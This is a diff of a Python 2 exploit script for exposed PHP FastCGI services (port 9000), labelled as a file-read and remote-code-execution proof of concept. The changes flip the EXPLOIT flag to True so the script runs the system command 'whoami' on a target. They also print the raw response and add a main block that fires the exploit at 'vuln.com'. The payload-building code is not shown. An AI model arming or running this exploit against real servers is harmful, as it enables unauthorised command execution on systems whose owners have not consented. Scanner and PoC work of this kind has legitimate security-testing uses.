@@ -6,13 +6,14 @@
 """
 PHP FastCGI Fileread/RCE PoC & Exp
 """
-
+import sys
+sys.path.append('../../')
 from plugin.util import randomString
 import socket
 
 PORT = 9000
 
-EXPLOIT = False  # set "True" to exec system commands
+EXPLOIT = True  # set "True" to exec system commands
 COMMAND = 'whoami'
 PHP_FILE_PATH = '/usr/share/php/PEAR.php'
 FLAG = randomString(10) if EXPLOIT else ':root:'
@@ -28,7 +29,7 @@ def poc(ip):
         sock.send(payload)
         ret = sock.recv(1024)
         sock.close()
-
+        print ret
         if ret.find(FLAG):
             return ip + ' -> ' +ret.split(FLAG)[1] if EXPLOIT else True
     except Exception, e:
@@ -100,3 +101,7 @@ def poc_data():
 
 def data_sort(data):
     return ''.join([chr(int(_, 16)) for _ in data.split()])
+
+
+if __name__ == '__main__':
+    print poc("vuln.com")
